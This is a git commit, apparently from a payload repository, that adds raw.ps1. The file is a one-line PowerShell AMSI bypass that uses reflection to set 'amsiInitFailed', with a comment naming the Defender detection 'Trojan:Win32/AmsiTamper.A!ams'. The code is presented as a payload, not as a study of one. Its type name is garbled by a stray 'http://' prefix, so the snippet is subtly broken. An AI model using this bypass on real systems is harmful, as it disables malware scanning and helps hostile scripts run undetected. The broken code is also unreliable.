9628db0ae1d9cfd409e538a802a765508232d80f
payloads45 <111106697+payloads45@users.noreply.github.com>
2023-01-19 00:06:27 -0800

    Create raw.ps1

---
+++ raw.ps1
@@ -0,0 +1,3 @@
+[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+#Detection Name : Trojan:Win32/AmsiTamper.A!ams
